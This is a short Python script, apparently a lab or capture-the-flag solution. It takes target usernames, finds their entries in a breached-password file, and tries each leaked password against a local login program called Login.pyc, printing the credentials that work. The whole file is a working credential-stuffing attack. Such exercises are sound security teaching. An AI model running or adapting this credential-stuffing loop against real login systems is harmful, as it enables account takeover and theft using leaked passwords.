import subprocess

with open('gang', 'r') as file:
    gang_members = file.read().splitlines() 

with open('PwnedPWfile', 'r') as file:
    userfile = file.read().splitlines() 

for member in gang_members:
    mem = len(member)
    for user in userfile:
        comma = user.index(',')
        if (member == user[0:comma]):
            print("Gang member match", user)
            result = subprocess.run(['python3', 'Login.pyc', member, user[comma+1:]], capture_output=True, text=True, check=True)
            if ('successful' in result.stdout):
                print(user)
        
